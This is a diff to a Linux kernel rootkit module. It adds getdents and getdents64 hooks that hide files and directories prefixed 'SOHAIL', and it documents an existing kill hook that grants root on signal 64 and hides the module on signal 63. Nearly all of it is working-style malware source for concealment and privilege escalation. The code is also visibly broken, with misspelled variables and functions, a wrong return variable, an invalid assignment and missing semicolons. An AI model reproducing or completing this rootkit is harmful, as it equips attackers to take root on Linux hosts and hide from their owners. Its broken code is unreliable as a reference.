@@ -24,6 +24,7 @@ enum signals{
 unsigned long *__sys_call_table = NULL;
 static int hidden = 0;
 static struct list_head *prev_module;
+#define PREFIX "SOHAIL"
 
 #ifdef CONFIG_X86_64
 /* on 64-bit x86 and kernel v4.17 syscalls are nolonger
@@ -36,6 +37,12 @@ static ptregs_t orig_kill;
 /* mkdir */
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
 static ptregs_t orig_mkdir;
+/* ls 64-bit*/
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
+static ptregs_t orig_getdents64;
+/* ls 32-bit */
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
+static ptregs_t orig_getdents;
 #else
 /* kill */
 typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
@@ -43,11 +50,22 @@ static orig_kill_t orig_kill;
 /* mkdir */
 typedef asmlinkage long(*orig_mkdir_t)(const char __user *pathname, umode_t mode);
 static orig_mkdir_t orig_mkdir;
+/* ls 64-bit */
+typedef asmlinkage long (*orig_getdents64_t)(unsigned int fd, struct linux_dirent64 *dirent, unsigned intcount);
+static orig_getdents64_t orig_getdents64;
+/* ls 32-bit */
+typedef asmlinkage long (*orig_getdents_t)(unsigned int fd, struct linux_dirent *dirent, unsigned intcount);
+static orig_getdents_t orig_getdents;
 #endif
 #endif
 
 
 #if PTREGS_SYSCALL_STUB
+/**
+ * if signal is 64 then gives the current user root privilegs
+ * if signale is 63 hides the rootkit
+ * kill
+*/
 static asmlinkage long hook_kill(const struct pt_regs *regs){
     int sig = regs->si;
     void set_root(void);
@@ -76,6 +94,10 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
     return orig_kill(regs);
 }
 
+/**
+ * sending any directory created to the dmesg logs
+ * mkdir
+*/
 static asmlinkage int hook_mkdir(const struct pt_regs *regs){
     char __user *pathname = (char *)regs->di;
     char dir_name[NAME_MAX] = {0};
@@ -91,7 +113,131 @@ static asmlinkage int hook_mkdir(const struct pt_regs *regs){
     return 0;
 }
 
+/**
+ * hiding directories and files with the PREFIX
+ * getdents64
+*/
+static asmlinkage long hook_getdents64(const struct pt_regs *regs){
+    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+    struct linux_dirent64 *current_dir, *dirent_ker, *previouse_dir = NULL;
+    long error;
+    unsigned long index = 0;
+
+    // get real output with all files in a directory
+    int reg = orig_getdents64(regs);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+    if((ret <=0) || (dirent_ker == NULL)){
+        return ret;
+    }
+
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if(error){
+        goto done;
+    }
+    
+    //loop through the directory to find the prefix
+    while(index < ret){
+        //looking at the first index.
+        current_dir = (void *)dirent_ker + index;
+
+        //checking if the file at the current directory has the prefix
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
+            // if the prefix is the first index of the list we have to move everything up
+            if(current_dir == dirent_ker){
+                ret -= current_dir->d_reclen;
+                memmov(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+
+            // we add the length of teh current directory to the previous one
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }else{
+            previous_dir = current_dir;
+        }
+        index += current_dir->d_reclen;
+    }
+    
+    // return altered list to user
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if(error){
+        goto done;
+    }
+
+done:
+    kfree(dirent_ker);
+    return ret;
+
+}
+
+/**
+ * hiding directories and files with the PREFIX
+ * getdents
+*/
+static asmlinkage long hook_getdents(const struct pt_regs *regs){
+    struct linux_dirent {
+        unsigned long d_ino;
+        unsigned long d_off;
+        unsignedshort d_reclen;
+        char d_name[];
+    }
+
+
+    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
+    struct linux_dirent *current_dir, *dirent_ker, *previouse_dir = NULL;
+    long error;
+    unsigned long index = 0;
+
+    // get real output with all files in a directory
+    int reg = orig_getdents(regs);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+    if((ret <=0) || (dirent_ker == NULL)){
+        return ret;
+    }
+
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if(error){
+        goto done;
+    }
+    
+    //loop through the directory to find the prefix
+    while(index < ret){
+        //looking at the first index.
+        current_dir = (void *)dirent_ker + index;
+
+        //checking if the file at the current directory has the prefix
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
+            // if the prefix is the first index of the list we have to move everything up
+            if(current_dir == dirent_ker){
+                ret -= current_dir->d_reclen;
+                memmov(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+
+            // we add the length of teh current directory to the previous one
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }else{
+            previous_dir = current_dir;
+        }
+        index += current_dir->d_reclen;
+    }
+    
+    // return altered list to user
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if(error){
+        goto done;
+    }
+
+done:
+    kfree(dirent_ker);
+    return ret;
+
+}
 #else
+/**
+ * if signal is 64 then gives the current user root privilegs
+ * if signale is 63 hides the rootkit
+ * kill
+*/
 static asmlinkage long hook_kill(pid_t pid, int sig){
 	void set_root(void);
     void hide_me(void);
@@ -119,6 +265,10 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
     return orig_kill(regs);
 }
 
+/**
+ * sending any directory created to the dmesg logs
+ * mkdir
+*/
 static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
 
     char dir_name[NAME_MAX] = {0};
@@ -132,6 +282,107 @@ static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
 
     orig_mkdir(pathname, mode);
     return 0;
+}
+
+/**
+ * hiding directories and files with the PREFIX
+ * getdents64
+*/
+static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
+    struct linux_dirent64 *current_dir, *previous_dir = NULL;
+    unsigned long index = 0;
+    long error;
+    
+    //getting actuall output of the dirr
+    int ret = orig_getdents64(fd,dirent,count);
+    dirent_ket = kzalloc(ret, GFP_KERNEL);
+    if((ret <=0) || (dirent_ker == NULL)){
+        return ret;
+    }
+
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if(error){
+        goto done;
+    }
+
+    //looping thorugh the list to find the prefix and then remove those instances
+    while(index < ret){
+        current_dir = (void *) dirent_ker = 0;
+
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0){
+            if(current_dir == dirent_ker){
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
+                continue;
+            }
+        }else{
+            previous_dir = current_dir;
+        }
+        index += current_dir->d_reclen;
+    }
+
+    error = copy_to_user(dirent,dirent_ker, ret);
+    if(error){
+        goto done;
+    }
+
+done:
+    kfree(dirent_ker);
+    return ret;
+}
+
+/**
+ * hiding directories and files with the PREFIX
+ * getdents
+*/
+static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
+    struct linux_dirent{
+        unsigned long d_ino;
+        unsigned long d_off;
+        unsigned long d_reclen;
+        char d_name[];
+    }
+
+    struct linux_dirent *current_dir, *previous_dir = NULL;
+    unsigned long index = 0;
+    long error;
+    
+    //getting actuall output of the dirr
+    int ret = orig_getdents(fd,dirent,count);
+    dirent_ket = kzalloc(ret, GFP_KERNEL);
+    if((ret <=0) || (dirent_ker == NULL)){
+        return ret;
+    }
+
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if(error){
+        goto done;
+    }
+
+    //looping thorugh the list to find the prefix and then remove those instances
+    while(index < ret){
+        current_dir = (void *) dirent_ker = 0;
+
+        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0){
+            if(current_dir == dirent_ker){
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
+                continue;
+            }
+        }else{
+            previous_dir = current_dir;
+        }
+        index += current_dir->d_reclen;
+    }
+
+    error = copy_to_user(dirent,dirent_ker, ret);
+    if(error){
+        goto done;
+    }
+
+done:
+    kfree(dirent_ker);
+    return ret;
 }
 #endif
 
@@ -215,6 +466,8 @@ static unsigned long *get_syscall_table(void){
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
 };
 
 /**
